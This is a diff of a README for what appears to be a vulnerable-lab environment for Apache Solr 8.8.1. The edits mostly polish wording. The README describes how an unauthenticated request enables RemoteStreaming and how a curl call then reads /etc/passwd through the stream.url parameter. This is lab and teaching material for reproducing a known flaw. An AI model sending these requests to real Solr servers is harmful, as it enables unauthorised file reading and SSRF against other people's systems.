@@ -2,29 +2,29 @@
 
 [中文版本(Chinese version)](README.zh-cn.md)
 
-Apache Solr is an open source search server. When Apache Solr does not enable authentication, an attacker can directly craft a request to enable a specific configuration, and eventually cause SSRF or arbitrary file reading.
+Apache Solr is an open-source search server. When Apache Solr does not have authentication enabled, an attacker can craft a request to enable specific configurations, potentially leading to Server-Side Request Forgery (SSRF) or arbitrary file reading vulnerabilities.
 
 References:
 
-- https://mp.weixin.qq.com/s/3WuWUGO61gM0dBpwqTfenQ
+- <https://mp.weixin.qq.com/s/3WuWUGO61gM0dBpwqTfenQ>
 
-## Vulnerability environment
+## Environment Setup
 
-Execute following commands to start a Apache Solr 8.8.1:
+Execute the following command to start an Apache Solr 8.8.1 server:
 
 ```
 docker compose up -d
 ```
 
-After the environment is started, browser `http://your-ip:8983` to view the Apache Solr.
+After the server starts, you can access the Apache Solr management interface at `http://your-ip:8983/`.
 
-## Exploit
+## Vulnerability Reproduction
 
 First, visit `http://your-ip:8983/solr/admin/cores?indexInfo=false&wt=json` to extract the database name:
 
 ![](1.png)
 
-Send the following request, modify the configuration of the database `demo` to enable `RemoteStreaming`:
+Send the following request to modify the configuration of the `demo` core and enable `RemoteStreaming`:
 
 ```
 curl -i -s -k -X $'POST' \
@@ -34,10 +34,10 @@ curl -i -s -k -X $'POST' \
 
 ![](2.png)
 
-Then read arbitrary file through `stream.url`:
+Then, you can read arbitrary files through the `stream.url` parameter:
 
 ```
-curl -i -s -k'http://your-ip:8983/solr/demo/debug/dump?param=ContentStreams&stream.url=file:///etc/passwd'
+curl -i -s -k 'http://your-ip:8983/solr/demo/debug/dump?param=ContentStreams&stream.url=file:///etc/passwd'
 ```
 
 ![](3.png)
